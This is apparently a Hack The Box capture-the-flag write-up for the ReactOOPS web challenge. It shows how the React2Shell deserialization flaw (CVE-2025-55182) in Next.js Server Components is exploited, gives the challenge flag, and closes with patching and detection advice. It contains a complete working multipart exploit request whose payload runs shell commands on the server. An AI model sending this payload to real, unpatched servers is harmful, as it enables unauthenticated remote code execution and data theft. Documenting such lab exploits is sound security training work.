---
title: "ReactOOPS"
description: "Exploit React2Shell (CVE-2025-55182) in React Server Components for unauthenticated command execution and flag recovery."
platform: "Hack The Box"
category: "Web"
difficulty: "Easy"
publishedAt: 2026-08-01
tags: ["web", "react", "nextjs", "rsc", "react2shell", "cve-2025-55182", "rce", "deserialization"]
language: "en"
translationKey: "hack-the-box/reactoops"
draft: false
featured: true
cover: "/images/reactoops/reactoops-02.png"
---

> This write-up only documents exploitation inside the authorized Hack The Box lab environment. Do not run this payload against systems outside your testing scope.

## Overview

ReactOOPS is a Hack The Box challenge that runs a vulnerable Next.js application for practicing React2Shell, tracked as CVE-2025-55182. The bug sits in how React Server Components decode payloads sent to React Server Functions, allowing pre-authentication remote code execution when an application uses affected RSC packages.

Challenge: [ReactOOPS](https://app.hackthebox.com/challenges/ReactOOPS?tab=play_challenge)

Key points:

- CVE-2025-55182 has a CVSS score of 10.0 and falls under unsafe deserialization.
- Affected React packages include `react-server-dom-webpack`, `react-server-dom-parcel`, and `react-server-dom-turbopack` in versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0.
- The corresponding React fixes are 19.0.1, 19.1.2, and 19.2.1; for Next.js, upgrade according to the official advisory for the framework version in use.

## Target Fingerprinting

First, I checked the HTTP headers of the instance:

```bash
curl -I http://154.57.164.82:30616/
```

![Curl header output showing the target runs Next.js and exposes RSC signals](/images/reactoops/reactoops-01.png)

The response includes `X-Powered-By: Next.js`. The `Vary` header also contains RSC-related values such as `rsc`, `next-router-state-tree`, `next-router-prefetch`, and `next-router-segment-prefetch`. That is enough signal to pivot into testing the React Server Components/Server Actions surface.

## Vulnerability Mechanics

The lab payload relies on how React Flight handles chunks and references inside form-data. The idea is to build a forged "thenable" object, control the reference path through `__proto__`, then force the server side to reach `constructor:constructor`, which is the `Function` constructor in Node.js.

In the request below:

- The `Next-Action: x` header sends the request into the Server Action handling path.
- The `then` field uses the reference string `$1:__proto__:then`.
- `_formData.get` points to `$1:constructor:constructor`.
- `_prefix` contains JavaScript that will run on the server. In this lab, the code calls Node.js' child process module to read `/app/flag.txt`, then throws `NEXT_REDIRECT` with a `digest` containing the result.

## Exploitation

I sent the following request with Burp Repeater. On a different instance, replace `Host`, `Content-Length`, the boundary, and the generated request IDs when needed.

```http
POST / HTTP/1.1
Host: 154.57.164.82:30616
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 755

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var main='main'+'Module';var mod='child'+'_process';var run='exec'+'Sync';var res=process[main].require(mod)[run]('cat /app/flag.txt',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

![Burp Repeater returning a 500 error with the flag inside the digest](/images/reactoops/reactoops-02.png)

The `500 Internal Server Error` response is expected for this exploitation style because the payload deliberately throws `NEXT_REDIRECT`. The important part is that the `digest` in the response reflected the output of `cat /app/flag.txt`.

## Flag

```text
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1tlc4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```

## Defense

The right fix is to patch the affected dependency, not to rely on payload filters or a WAF as the primary control. For React RSC, upgrade the `react-server-dom-*` packages to at least the patched releases; for Next.js, follow the official patched release line and prefer the latest supported version.

After patching, rotate secrets if the application may have been exploited, because this is pre-authentication RCE. At the monitoring layer, pay attention to unusual POST requests carrying `Next-Action`, form-data payloads containing `__proto__`, `constructor:constructor`, calls to Node.js' child process module, or unexpected outbound traffic from the application server.

## Lessons Learned

ReactOOPS shows that a single framework header like `X-Powered-By: Next.js`, together with a few RSC hints in `Vary`, can be enough to steer exploitation. With framework-level vulnerabilities, identifying the runtime correctly matters as much as having the payload: once the RSC/Server Actions surface matches, the rest is about controlling the deserialization flow to land command execution on the server.

## References

- [React: Critical Security Vulnerability in React Server Components](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [GitHub Security Advisory GHSA-fv66-9v8q-g76r](https://github.com/facebook/react/security/advisories/GHSA-fv66-9v8q-g76r)
- [Next.js advisory for React2Shell impact](https://nextjs.org/blog/CVE-2025-66478)
- [Hack The Box: React2Shell CVE-2025-55182 threat spotlight](https://www.hackthebox.com/blog/react2shell-cve-2025-55182-threat-spotlight)
- [Hack The Box ReactOOPS challenge](https://app.hackthebox.com/challenges/ReactOOPS?tab=play_challenge)
